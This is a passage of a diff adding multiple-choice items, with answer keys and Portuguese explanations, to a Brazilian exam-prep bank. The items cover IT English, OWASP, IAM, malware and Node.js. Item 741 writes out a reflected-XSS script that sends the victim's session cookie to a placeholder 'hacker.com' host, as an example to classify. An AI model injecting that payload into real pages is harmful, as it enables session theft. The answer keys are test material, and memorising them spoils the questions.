+    },
+    "answer": "C",
+    "explanation": "- C) Correta. Trata-se de uma First Conditional (If + Present Simple, ... + Future Simple). Se o servidor falhar (crashes - Presente), as mudanças *serão* perdidas (will be - Futuro)."
+  },
+  {
+    "id": 730,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês para TI",
+    "statement": ")\nRead the sentence:\n*\"Unlike traditional relational databases, NoSQL databases are designed to scale horizontally across many servers, making them ideal for large-scale distributed data.\"*\n\nThe word \"Unlike\" in the sentence introduces an idea of:",
+    "options": {
+      "A": "similarity.",
+      "B": "addition.",
+      "C": "contrast.",
+      "D": "consequence.",
+      "E": "purpose."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. \"Unlike\" significa \"Ao contrário de\" ou \"Diferentemente de\", estabelecendo claramente uma relação de contraste entre bancos de dados relacionais tradicionais e bancos NoSQL."
+  },
+  {
+    "id": 731,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês para TI",
+    "statement": ")\nRead the sentence:\n*\"The network administrator noticed that the firewall was blocking legitimate traffic, ________ he updated the rule set immediately.\"*\n\nChoose the most appropriate conjunction to fill in the blank:",
+    "options": {
+      "A": "although",
+      "B": "because",
+      "C": "however",
+      "D": "so",
+      "E": "despite"
+    },
+    "answer": "D",
+    "explanation": "- D) Correta. A oração introduz uma consequência. O administrador notou um problema, *portanto/então* (so) ele atualizou as regras. \"Although\" (embora) e \"However\" (entretanto) indicam contraste. \"Because\" (porque) indicaria causa invertida."
+  },
+  {
+    "id": 732,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês para TI",
+    "statement": ")\nIn the sentence *\"Developers must ensure that their code is thoroughly tested before deployment\"*, the word *\"thoroughly\"* can be correctly replaced, without changing the meaning, by:",
+    "options": {
+      "A": "hastily.",
+      "B": "completely.",
+      "C": "barely.",
+      "D": "rarely.",
+      "E": "partially."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. \"Thoroughly\" significa de maneira completa, minuciosa ou rigorosa. \"Completely\" é o sinônimo mais próximo. \"Hastily\" significa apressadamente, e \"barely\" significa mal/quase não."
+  },
+  {
+    "id": 733,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês para TI",
+    "statement": ")\n**Read the paragraph:**\n*Cybersecurity is not just a technical issue; it is a business imperative. A successful ransomware attack can paralyze operations, damage a company's reputation, and lead to significant financial losses. Therefore, regular audits and employee training are essential.*\n\nWhat is the main conclusion of the paragraph regarding cybersecurity?",
+    "options": {
+      "A": "It is solely a technical problem handled by the IT department.",
+      "B": "Ransomware attacks only affect a company's financial status.",
+      "C": "Audits should be avoided to save financial resources.",
+      "D": "It requires proactive measures like training and auditing due to its severe business impact.",
+      "E": "Employee training is less important than technical solutions."
+    },
+    "answer": "D",
+    "explanation": "- D) Correta. O texto conclui (\"Therefore...\") que auditorias regulares e treinamento de funcionários são essenciais justamente porque a cibersegurança é um imperativo de negócios cujas falhas podem paralisar operações e causar perdas."
+  },
+  {
+    "id": 734,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês para TI",
+    "statement": ")\nFill in the blank with the appropriate preposition:\n*\"The new privacy policy is compliant ________ the General Data Protection Regulation (GDPR).\"*",
+    "options": {
+      "A": "to",
+      "B": "by",
+      "C": "with",
+      "D": "at",
+      "E": "on"
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. Em inglês, a regência correta para o adjetivo \"compliant\" (em conformidade) é com a preposição \"with\". Diz-se sempre \"compliant with something\"."
+  },
+  {
+    "id": 735,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês para TI",
+    "statement": ")\nAnalyze the following sentence structure:\n*\"By the time the system is launched next month, the testing team ________ all the major bugs.\"*\n\nWhich verbal form correctly completes the sentence?",
+    "options": {
+      "A": "will have fixed",
+      "B": "fixes",
+      "C": "fixed",
+      "D": "has fixed",
+      "E": "was fixing"
+    },
+    "answer": "A",
+    "explanation": "- A) Correta. A expressão \"By the time... next month\" indica uma ação que estará concluída em um momento específico no futuro. O tempo verbal correto para isso é o Future Perfect (\"will have fixed\" - terá corrigido)."
+  },
+  {
+    "id": 736,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês para TI",
+    "statement": ")\n**Read the text:**\n*A zero-day vulnerability is a computer-software vulnerability that is unknown to those who should be interested in mitigating the vulnerability. Until the vulnerability is mitigated, hackers can exploit it to adversely affect computer programs.*\n\nWhy is a \"zero-day vulnerability\" particularly dangerous according to the text?",
+    "options": {
+      "A": "Because it takes exactly zero days to fix.",
+      "B": "Because the creators of the software are unaware of it, leaving it unpatched and open to exploitation.",
+      "C": "Because it only affects hardware devices, not software.",
+      "D": "Because it is mitigated automatically by antivirus programs.",
+      "E": "Because hackers warn the developers before exploiting it."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. O texto afirma que é uma vulnerabilidade \"unknown\" (desconhecida) por aqueles que deveriam mitigá-la (os desenvolvedores). Por isso os hackers podem explorá-la livremente até que seja descoberta e corrigida."
+  },
+  {
+    "id": 737,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês para TI",
+    "statement": ")\nIdentify the passive voice version of the active sentence: \n*\"The developer committed the new source code to the repository yesterday.\"*",
+    "options": {
+      "A": "The new source code commits to the repository yesterday by the developer.",
+      "B": "The repository is committed by the new source code yesterday.",
+      "C": "The new source code was committed to the repository by the developer yesterday.",
+      "D": "The developer was committing the new source code to the repository yesterday.",
+      "E": "The new source code has been committed to the repository yesterday."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. Na voz passiva, o objeto da ativa (\"the new source code\") torna-se o sujeito. Como o verbo está no passado simples (\"committed\"), o verbo 'to be' deve ir para o passado (\"was\"), seguido do particípio passado do verbo principal. Portanto: \"was committed\"."
+  },
+  {
+    "id": 738,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês para TI",
+    "statement": ")\nIn software engineering, the term **\"deployment\"** refers to:",
+    "options": {
+      "A": "The process of gathering requirements from the client.",
+      "B": "The initial stage of writing the code architecture.",
+      "C": "All of the activities that make a software system available for use.",
+      "D": "Finding and resolving bugs in the software.",
+      "E": "The permanent deletion of a system from the servers."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. \"Deployment\" (implantação) refere-se ao processo de colocar o software em ambiente de produção, disponibilizando-o para ser utilizado pelos usuários."
+  },
+  {
+    "id": 739,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês para TI",
+    "statement": ")\nRead the following troubleshooting step:\n*\"Ensure that the router is plugged in. ________, check if the network cables are firmly connected.\"*\n\nWhich linking word best fits the blank to add the next instruction?",
+    "options": {
+      "A": "Nevertheless",
+      "B": "Furthermore",
+      "C": "Instead",
+      "D": "Although",
+      "E": "Despite"
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. A oração quer adicionar uma instrução (verificar os cabos) à instrução anterior (certificar-se de que o roteador está ligado). \"Furthermore\" (além disso) é a única conjunção aditiva. As outras indicam contraste ou oposição."
+  },
+  {
+    "id": 740,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês para TI",
+    "statement": ")\n**Read the sentence:**\n*\"The new API endpoint is much faster than the old one, but it is also more prone to throwing errors if the payload is malformed.\"*\n\nWhat does the phrase *\"prone to\"* mean in this context?",
+    "options": {
+      "A": "Immune to.",
+      "B": "Unlikely to.",
+      "C": "Protected against.",
+      "D": "Susceptible to.",
+      "E": "Capable of preventing."
+    },
+    "answer": "D",
+    "explanation": "- D) Correta. \"Prone to\" significa estar propenso a, sujeito a, ou suscetível a (susceptible to) algo, geralmente algo negativo (neste caso, a disparar erros)."
+  },
+  {
+    "id": 741,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Segurança da Informação (Ameaças, OWASP, IAM e OIDC)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM",
+    "statement": ")\nUm Tribunal Estadual implementou uma nova página de consulta processual. O Analista de Segurança, durante um pentest (teste de invasão), inseriu no campo de busca de processos a string `<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>`. Ao pesquisar, a página não sanitizou o input, e o script foi refletido diretamente na tela do navegador, enviando o cookie de sessão do analista para o servidor remoto. Segundo o OWASP Top 10 (2021), esse clássico vetor de ataque de injeção client-side é denominado:",
+    "options": {
+      "A": "SQL Injection (SQLi).",
+      "B": "Cross-Site Request Forgery (CSRF).",
+      "C": "Cross-Site Scripting (XSS).",
+      "D": "Broken Access Control.",
+      "E": "Server-Side Request Forgery (SSRF)."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. O XSS (Cross-Site Scripting) ocorre quando a aplicação web inclui dados não confiáveis em uma página web sem a devida validação ou escape. Como o script injetado rodou no navegador (client-side) roubando o cookie, trata-se de um XSS Refletido."
+  },
+  {
+    "id": 742,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Segurança da Informação (Ameaças, OWASP, IAM e OIDC)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM",
+    "statement": ")\nUm engenheiro de segurança foi acionado porque a rede do Tribunal sofreu indisponibilidade severa. Analisando os logs de borda, constatou-se que os servidores web não haviam sido comprometidos, mas suas portas de entrada estavam sendo inundadas por 50 milhões de requisições malformadas de SYN Flood por segundo, originadas simultaneamente de milhares de câmeras IP e roteadores domésticos infectados globalmente. Essa tipologia de ataque é estritamente classificada como:",
+    "options": {
+      "A": "Ransomware de dupla extorsão.",
+      "B": "Ataque de Força Bruta de Senhas.",
+      "C": "DDoS (Distributed Denial of Service) volumétrico.",
+      "D": "Injeção de Comandos de Sistema Operacional.",
+      "E": "Phishing direcionado."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. Trata-se de um ataque Distribuído de Negação de Serviço (DDoS). Como a inundação provém de milhares de IPs distintos (botnet), o firewall tem enorme dificuldade de mitigar a sobrecarga."
+  },
+  {
+    "id": 743,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Segurança da Informação (Ameaças, OWASP, IAM e OIDC)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM",
+    "statement": ")\nUm magistrado de alta patente do TRT recebeu um e-mail urgente, com a logomarca perfeita da presidência, exigindo que ele clicasse num link e digitasse sua credencial institucional para 'evitar a exclusão sumária do seu token eletrônico de processos'. Nenhum outro servidor recebeu este e-mail; o ataque foi desenhado exclusivamente para ele, usando dados de sua rotina. Esta variação cirúrgica e altamente personalizada de engenharia social voltada a alvos de altíssimo escalão é conhecida como:",
+    "options": {
+      "A": "Adware.",
+      "B": "Vishing (Voice Phishing).",
+      "C": "Whaling (Phishing de Baleia).",
+      "D": "Pharming de DNS.",
+      "E": "Worm de e-mail massivo."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. O Phishing comum é jogado ao mar para qualquer um. O Spear Phishing é direcionado a uma pessoa/grupo. O *Whaling* (pesca da baleia) é focado exclusivamente em executivos C-level, diretores ou altas autoridades."
+  },
+  {
+    "id": 744,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Segurança da Informação (Ameaças, OWASP, IAM e OIDC)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM",
+    "statement": ")\nNo OWASP Top 10 de 2021, a categoria que saltou para a posição número 1 (A01) refere-se a falhas que permitem que um usuário atue fora de suas permissões pretendidas. Um exemplo ocorre quando o usuário logado `Joao123` percebe que a URL do seu painel é `site.com/perfil?id=50`. Ele manualmente altera a URL para `id=51` e consegue ler e editar livremente os dados sensíveis da usuária `Maria456`. Esta vulnerabilidade específica é o cerne do:",
+    "options": {
+      "A": "Insecure Design (Design Inseguro).",
+      "B": "Cryptographic Failures (Falhas Criptográficas).",
+      "C": "Broken Access Control (Quebra de Controle de Acesso).",
+      "D": "Security Misconfiguration (Configuração Insegura).",
+      "E": "Vulnerable and Outdated Components."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. A Quebra de Controle de Acesso (Broken Access Control) assumiu a liderança do OWASP. O exemplo dado é a clássica IDOR."
+  },
+  {
+    "id": 745,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Segurança da Informação (Ameaças, OWASP, IAM e OIDC)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM",
+    "statement": ")\nPara modernizar a autenticação de cidadãos no portal de serviços, a equipe de TI do TJ optou por utilizar o protocolo federado do gov.br. O arquiteto explicou: 'Nós usaremos o OAuth 2.0 sob o capô, mas o OAuth 2.0 puro só provê um *Access Token* opaco (autorização para acessar APIs). Para que nosso portal saiba **quem** é o usuário (Nome, CPF, E-mail autenticado), precisamos adicionar a camada padronizada que envelopa o *ID Token* formatado em JWT por cima do OAuth 2.0'. Essa camada de identidade descrita pelo arquiteto é o:",
+    "options": {
+      "A": "SAML 2.0.",
+      "B": "LDAP v3.",
+      "C": "OpenID Connect (OIDC).",
+      "D": "Kerberos e Active Directory.",
+      "E": "X.509 Certificates."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. O OpenID Connect (OIDC) é o padrão de Identidade construído no topo do protocolo de Autorização OAuth 2.0."
+  },
+  {
+    "id": 746,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Segurança da Informação (Ameaças, OWASP, IAM e OIDC)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM",
+    "statement": ")\nDurante uma auditoria de segurança da infraestrutura AWS de um Tribunal, identificou-se que a base de dados principal de estagiários foi exposta publicamente. A falha ocorreu porque o estagiário criou um bucket S3 e, por falta de conhecimento, marcou a permissão nativa 'Public Read' no console, esquecendo-se também de desabilitar o painel padrão do Apache Tomcat exposto na porta 8080. Na categorização do OWASP Top 10 (2021), essas falhas logísticas operacionais puras não são falhas de código, mas sim:",
+    "options": {
+      "A": "A03: Injection.",
+      "B": "A05: Security Misconfiguration (Configuração Insegura de Segurança).",
+      "C": "A08: Software and Data Integrity Failures.",
+      "D": "A10: Server-Side Request Forgery.",
+      "E": "A02: Cryptographic Failures."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. A Configuração Insegura é o risco associado a configurações padrão não alteradas e portas expostas indevidamente."
+  },
+  {
+    "id": 747,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Segurança da Informação (Ameaças, OWASP, IAM e OIDC)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM",
+    "statement": ")\nUma servidora pública conectou um pen-drive achado no estacionamento em seu computador de trabalho. Silenciosamente, o software contido no pen-drive se instalou na memória e começou a rastrear as teclas digitadas, enviando as senhas do sistema processual para um servidor na Rússia, sem que os arquivos normais do PC fossem corrompidos. O tipo específico de malware projetado primariamente para este fim é o:",
+    "options": {
+      "A": "Ransomware de Criptografia.",
+      "B": "Worm Autopropagável.",
+      "C": "Spyware (especificamente da categoria Keylogger).",
+      "D": "Adware focado em banners pop-up.",
+      "E": "Botnet Herder."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. Spyware é o malware espião focado em coletar dados sem o consentimento da vítima. O keylogger é a variante que mapeia digitação de teclado."
+  },
+  {
+    "id": 748,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Segurança da Informação (Ameaças, OWASP, IAM e OIDC)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM",
+    "statement": ")\nUm Arquiteto de IAM de um órgão governamental deve configurar a política de permissões na nuvem. Ele define que um novo Analista Jr. deve receber estritamente o acesso à tabela A, negando explicitamente as tabelas B, C e qualquer painel administrativo, garantindo que ele tenha acesso APENAS aos privilégios essenciais para executar sua função diária, nada mais. O princípio basal da segurança aplicado aqui é o:",
+    "options": {
+      "A": "Princípio do Menor Privilégio (Least Privilege).",
+      "B": "Segregação de Funções (Segregation of Duties).",
+      "C": "Segurança por Obscuridade.",
+      "D": "Zero Trust Network Access dinâmico.",
+      "E": "Single Sign-On (SSO)."
+    },
+    "answer": "A",
+    "explanation": "- A) Correta. O Princípio do Menor Privilégio afirma que os usuários devem ter apenas os níveis de acesso estritamente necessários para a conclusão de suas tarefas."
+  },
+  {
+    "id": 749,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Segurança da Informação (Ameaças, OWASP, IAM e OIDC)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM",
+    "statement": ")\nNo ecossistema corporativo, é comum possuir múltiplos serviços de Back-end e Portais. Para evitar o 'fadiga de senhas' onde o usuário precisa decorar 15 senhas diferentes, implementa-se um Gateway de Identidade onde o login é efetuado uma única vez e o token JWT repassado aos aplicativos. Este conceito de autenticação centralizada unificada é conhecido como:",
+    "options": {
+      "A": "Cross-Site Request Forgery.",
+      "B": "Two-Factor Authentication (2FA).",
+      "C": "Single Sign-On (SSO).",
+      "D": "Biometria OAUTH-2.",
+      "E": "Role-Based Access Control (RBAC)."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. O SSO (Single Sign-On) é a capacidade de um usuário se autenticar apenas uma vez em um provedor e acessar múltiplos sistemas distintos."
+  },
+  {
+    "id": 750,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Segurança da Informação (Ameaças, OWASP, IAM e OIDC)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM",
+    "statement": ")\nNa sexta-feira, toda a infraestrutura Windows do Tribunal foi congelada. As telas exibiam um cronômetro regressivo com uma mensagem vermelha instruindo o presidente a transferir 50 Bitcoins, ou então as chaves usadas para travar as tabelas seriam apagadas permanentemente. Qual malware tem como característica central essa modalidade?",
+    "options": {
+      "A": "Trojan Horse Financeiro.",
+      "B": "Phishing de Extorsão.",
+      "C": "Ransomware.",
+      "D": "Rootkit profundo de kernel.",
+      "E": "Vírus de Macro."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. Ransom (Resgate) + Software = Ransomware. Ele criptografa arquivos tornando-os ilegíveis e cobra resgate pela chave."
+  },
+  {
+    "id": 751,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Segurança da Informação (Ameaças, OWASP, IAM e OIDC)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM",
+    "statement": ")\nUma nova diretriz determina que, ao acessar sistemas críticos na VPN, além de saber a senha (`Knowledge factor`), o analista deve inserir um código gerado no smartphone (`Possession factor`). Esse requisito de segurança é denominado:",
+    "options": {
+      "A": "Criptografia Assimétrica.",
+      "B": "Autenticação Multifator (MFA / 2FA).",
+      "C": "Biometria Baseada em IA.",
+      "D": "OpenID Connect Verification.",
+      "E": "ABAC."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. A MFA (Multi-Factor Authentication) exige duas ou mais evidências de categorias diferentes (Saber e Ter)."
+  },
+  {
+    "id": 752,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Segurança da Informação (Ameaças, OWASP, IAM e OIDC)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM",
+    "statement": ")\nAo analisar a rede, a perícia detectou que o malware não precisou de nenhuma interação humana. Ele se replicou automaticamente explorando uma vulnerabilidade do SMB, caçando ativamente outras máquinas vulneráveis na rede. A característica marcante de autorreplicação via rede sem intervenção humana é típica de qual malware?",
+    "options": {
+      "A": "Worm (Verme).",
+      "B": "Virus de Boot Sector.",
+      "C": "Cavalo de Troia (Trojan).",
+      "D": "Spyware Rootkit.",
+      "E": "Tracking Cookie."
+    },
+    "answer": "A",
+    "explanation": "- A) Correta. A principal diferença entre Vírus e Worm: o WORM viaja de máquina em máquina sozinho, explorando falhas de rede de forma autônoma."
+  },
+  {
+    "id": 753,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Segurança da Informação (Ameaças, OWASP, IAM e OIDC)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM",
+    "statement": ")\nUma vulnerabilidade no OWASP Top 10 é o 'Insecure Design' (A04). Um arquiteto não implementou checagens de bot (CAPTCHA) no e-commerce. Um robô esgotou o estoque. Sob a ótica do OWASP, por que essa falha configura um Insecure Design e não Insecure Implementation (bug de código)?",
+    "options": {
+      "A": "Porque o código escrito não compilava.",
+      "B": "Porque o design não usava microsserviços.",
+      "C": "Porque uma falha de design (falta de proteção de processos de negócio) não pode ser consertada por um código perfeito sem mudar a arquitetura lógica.",
+      "D": "Porque ocorreu Null Pointer Exception.",
+      "E": "Porque as senhas estavam em plain text."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. Insecure Design lida com a falta de desenho arquitetural de controles. Código perfeito num fluxo lógico falho não protege o sistema."
+  },
+  {
+    "id": 754,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Segurança da Informação (Ameaças, OWASP, IAM e OIDC)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM",
+    "statement": ")\nUm ataque redireciona o tráfego manipulando diretamente a configuração DNS do roteador. O usuário digita perfeitamente `www.bancodobrasil.com.br`, mas é levado a um site falso sem clicar em nenhum link de email. Esta técnica é denominada:",
+    "options": {
+      "A": "Ransomware Injetável.",
+      "B": "Spoofing de MAC Address.",
+      "C": "DDoS State Exhaustion.",
+      "D": "Pharming.",
+      "E": "Sniffing Passivo OSPF."
+    },
+    "answer": "D",
+    "explanation": "- D) Correta. Pharming altera a tabela de DNS ou arquivo hosts. A conversão DNS aponta para o servidor criminoso furtivamente."
+  },
+  {
+    "id": 755,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Segurança da Informação (Ameaças, OWASP, IAM e OIDC)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM",
+    "statement": ")\nO JWT (JSON Web Token) é divido em 3 partes. O que garante criptograficamente a integridade do JWT, assegurando ao IAM que o token não teve seus atributos adulterados no navegador?",
+    "options": {
+      "A": "O Header.",
+      "B": "A Payload.",
+      "C": "A Assinatura (Signature).",
+      "D": "O banco PostgreSQL.",
+      "E": "O certificado SSL."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. A terceira parte do JWT é a Assinatura (Signature). A assinatura impede que os dados abertos do payload sejam violados."
+  },
+  {
+    "id": 756,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Eng. de Software (JS, TS, Node.js e LLMs)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs",
+    "statement": ")\nUm Desenvolvedor migrou uma aplicação para Node.js usando o V8. Na produção, ao disparar relatórios PDF pesados em CPU, a API REST web travou e novas requisições entraram em estado pendente. Essa falha ocorreu estruturalmente porque:",
+    "options": {
+      "A": "Node.js não suporta geração de PDFs.",
+      "B": "A arquitetura nativa do Node é baseada em uma única thread principal (Event Loop) para I/O Assíncrono. Tarefas intensivas de bloqueio de CPU travam o laço.",
+      "C": "O Garbage Collector do V8 apagou a memória.",
+      "D": "Faltou uso de Promises nativas.",
+      "E": "Faltou transpilagem para TypeScript."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. O Event Loop morre sufocado em operações pesadas matemáticas/processuais (CPU-Bound), porque a thread primária fica ocupada."
+  },
+  {
+    "id": 757,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Eng. de Software (JS, TS, Node.js e LLMs)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs",
+    "statement": ")\nO argumento técnico primário dos arquitetos para migrar a interface de React.js para TypeScript (`.ts`) em larga complexidade governamental é que o TypeScript:",
+    "options": {
+      "A": "Executa diretamente no navegador Chrome mais rápido.",
+      "B": "Substitui o Node pelo modelo JVM.",
+      "C": "Adiciona um sistema de tipagem estática, detectando erros em tempo de compilação, o que reduz falhas de execução em produção.",
+      "D": "Proíbe arrays por segurança.",
+      "E": "Roda nativamente no banco de dados."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. O superpoder do TypeScript é a segurança de tipos (Static Typing), evitando falhas inesperadas de tipo em runtime."
+  },
+  {
+    "id": 758,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Eng. de Software (JS, TS, Node.js e LLMs)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs",
+    "statement": ")\nAo solicitar a um LLM a criação de uma rotina complexa, a IA sugeriu o uso de uma biblioteca exótica e inventou métodos mirabolantes que não existem. Esse fenômeno técnico dos LLMs é conhecido como:",
+    "options": {
+      "A": "Zero-Day Exploit Training.",
+      "B": "Hallucination (Alucinação).",
+      "C": "Overfitting Semântico Reativo.",
+      "D": "Backpropagation Divergente.",
+      "E": "Prompt Injection Direto."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. 'Alucinação' acontece quando o LLM preenche lacunas inventando informações plausíveis mas incorretas factualmente."
+  },
+  {
+    "id": 759,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Eng. de Software (JS, TS, Node.js e LLMs)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs",
+    "statement": ")\nO uso de `async` e `await` no corpo da função de requisição em JavaScript moderno ES6 tem o propósito primordial arquitetural de:",
+    "options": {
+      "A": "Compilar o JavaScript simultaneamente para Android.",
+      "B": "Criar múltiplas instâncias de CPU.",
+      "C": "Promover um código mais limpo, resolvendo a cadeia de Promises e evitando o 'Callback Hell' sem bloquear a thread.",
+      "D": "Bloquear forçadamente a renderização visual do HTML.",
+      "E": "Habilitar persistência infinita via Cookies."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. A dupla `async/await` permite escrever rotinas assíncronas como se fossem síncronas, melhorando radicalmente a legibilidade."
+  },
+  {
+    "id": 760,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Eng. de Software (JS, TS, Node.js e LLMs)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs",
+    "statement": ")\nAo injetar o arquivo nativo `.ts` no servidor Apache como `<script src='auditoria.ts'></script>`, o sistema web travou alegando erro de sintaxe. A falha ocorreu porque:",
+    "options": {
+      "A": "Tipagem Dinâmica não tolerante.",
+      "B": "Falta de injeção Spring Boot.",
+      "C": "Os navegadores compreendem exclusivamente JavaScript. O TypeScript precisa passar por 'Transpilação' usando o compilador para gerar o arquivo `.js` final.",
+      "D": "Falta da diretiva `strict-mode`.",
+      "E": "Falta de um DNS reverso."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. Navegadores não entendem TS nativamente. É obrigatória a transpilação para o JS padrão da web."
+  },
+  {
+    "id": 761,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Eng. de Software (JS, TS, Node.js e LLMs)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs",
+    "statement": ")\nJogar trechos complexos de código processual sensível na caixa do ChatGPT comercial aberto apresenta o risco intrínseco de:",
+    "options": {
+      "A": "Vazamento de Dados Sensíveis (Data Privacy), uma vez que o código pode ser utilizado no treinamento e inferência dos provedores.",
+      "B": "Aumento da latência no Linux local.",
+      "C": "Danos puramente estéticos no PEP8.",
+      "D": "DoS volumétrico mitigando portas altas.",
+      "E": "Invasão física nas fitas do datacenter."
+    },
+    "answer": "A",
+    "explanation": "- A) Correta. Dados enviados para IAs públicas podem ser retidos para treinar modelos, configurando violação grave de confidencialidade governamental."
+  },
+  {
+    "id": 762,
+    "day_id": "dia_05_06",
+    "day_title": "Sexta-feira 05/06",
+    "theme": "Eng. de Software (JS, TS, Node.js e LLMs)",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs",
+    "statement": ")\nO core primário do Node.js que orquestra eficientemente a execução interligada e a distribuição assíncrona, garantindo o 'Non-Blocking I/O', é conhecido como:",
+    "options": {
